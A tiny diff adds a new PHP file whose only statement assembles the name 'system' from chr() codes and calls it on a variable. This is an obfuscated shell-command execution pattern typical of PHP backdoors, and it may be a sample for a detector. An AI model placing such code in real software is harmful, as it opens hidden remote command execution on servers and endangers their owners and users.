@@ -1,0 +1,2 @@
+<?php
+call_user_func(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109), $x);
